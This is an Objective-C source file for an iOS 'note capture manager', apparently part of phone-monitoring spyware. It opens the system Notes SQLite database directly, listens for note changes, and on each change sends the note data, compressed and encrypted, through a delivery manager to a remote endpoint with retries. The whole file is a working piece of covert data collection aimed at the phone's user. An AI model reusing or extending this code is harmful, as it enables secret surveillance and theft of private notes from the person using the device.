//
//  NoteManagerImpl.m
//  NoteManager
//
//  Created by Ophat on 1/16/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "NoteManagerImpl.h"
#import "NoteContext.h"
#import "NoteEventNotifier.h"
#import "NoteDeliveryDelegate.h"
#import "NoteDataProvider.h"

#import "SendNote.h"

#import "DeliveryRequest.h"
#import "DeliveryResponse.h"
#import "DataDelivery.h"

#import <CoreData/NSManagedObjectContext.h>
#import <CoreData/NSPersistentStoreCoordinator.h>


#define kNoteDatabaseURL				@"file://localhost/var/mobile/Library/Notes/notes.sqlite"

@interface NoteManagerImpl (private)
- (DeliveryRequest*) noteRequest;
-(void)noteDidChange;

@end

@implementation NoteManagerImpl

-(id)initWithDDM:(id<DataDelivery>)aDataDelivery{
	if ((self = [super init])) {
		DLog(@"Note capture manager allocated...");
		
		mDDM = aDataDelivery;
		
		// -- initialize Note Context to get the notification from Note application
		mNoteContext = [[NoteContext alloc] init];		
		NSURL *url = [NSURL URLWithString:kNoteDatabaseURL];
		NSPersistentStoreCoordinator *psc = [mNoteContext persistentStoreCoordinator];
		[psc persistentStoreForURL:url];
		[psc setURL:url forPersistentStore:[[psc persistentStores] objectAtIndex:0]];
		
		mNoteEventNotifier = [[NoteEventNotifier alloc] init];
		[mNoteEventNotifier setMNoteChangeDelegate:self];
		[mNoteEventNotifier setMNoteChangeSelector:@selector(noteDidChange)];
		
		mNoteDataProvider = [[NoteDataProvider alloc] init];
		//[mNoteDataProvider setMNoteContext:mNoteContext];			// Move the code to initiate NoteContext to provider to get the updated note entries
		
		if ([mDDM isRequestPendingForCaller:kDDC_NoteManager]) {
			DLog(@"Register caller ID with DDM");
			[mDDM registerCaller:kDDC_NoteManager withListener:self];
		}
	}
	return (self);
}


- (void) startCapture {
	[mNoteEventNotifier start];
}

- (void) stopCapture {
	[mNoteEventNotifier stop];
}

-(BOOL) deliverNote:(id<NoteDeliveryDelegate>)aNoteDeliveryDelegate{
	DLog(@"deliverNote, aNoteDeliveryDelegate = %@", aNoteDeliveryDelegate)
	BOOL canProcess = NO;
	DeliveryRequest* request = [self noteRequest];
	if (![mDDM isRequestIsPending:request]) {
		DLog (@"not pending")
		// SendNote is in ProtocolBuider
		SendNote* sendNote = [mNoteDataProvider commandData];
		[request setMCommandCode:[sendNote getCommand]]; 
		[request setMCompressionFlag:1];
		[request setMEncryptionFlag:1];
		[request setMCommandData:sendNote];
		[request setMDeliveryListener:self];
		[mDDM deliver:request];
		
		mDelegate = aNoteDeliveryDelegate;				// set delegate
		
		canProcess = YES;
	}
	return canProcess;
}
- (void) requestFinished: (DeliveryResponse*) aResponse{
	id <NoteDeliveryDelegate> delegate = mDelegate;
	mDelegate = nil;
	
	NSError *error = nil;
	if (![aResponse mSuccess]) {
		NSDictionary *userInfo = [NSDictionary dictionaryWithObject:aResponse forKey:@"DeliveryResponse"];
		error = [NSError errorWithDomain:@"Send note failed" code:[aResponse mStatusCode] userInfo:userInfo];
	}
	
	if ([delegate respondsToSelector:@selector(noteDidDelivered:)]) {
		[delegate performSelector:@selector(noteDidDelivered:) withObject:error];
	}
}

- (void) updateRequestProgress: (DeliveryResponse*) aResponse{
	// NO IMIMPLEMENTATION
}

#pragma mark -
#pragma mark Private methods
#pragma mark -

- (DeliveryRequest*) noteRequest {
	DeliveryRequest* request = [[DeliveryRequest alloc] init];
    [request setMCallerId:kDDC_NoteManager];		// same for installed and running app
    [request setMPriority:kDDMRequestPriortyNormal];
    [request setMMaxRetry:3];
    [request setMEDPType:kEDPTypeSendNote];
    [request setMRetryTimeout:60];
    [request setMConnectionTimeout:60];
	[request autorelease];
	return request;
}

-(void) noteDidChange {
	[self deliverNote:mDelegate];
}

- (void) dealloc {
	[self stopCapture];
	[mNoteDataProvider release];
	[mNoteEventNotifier release];
	[mNoteContext release];
	[super dealloc];
}

@end
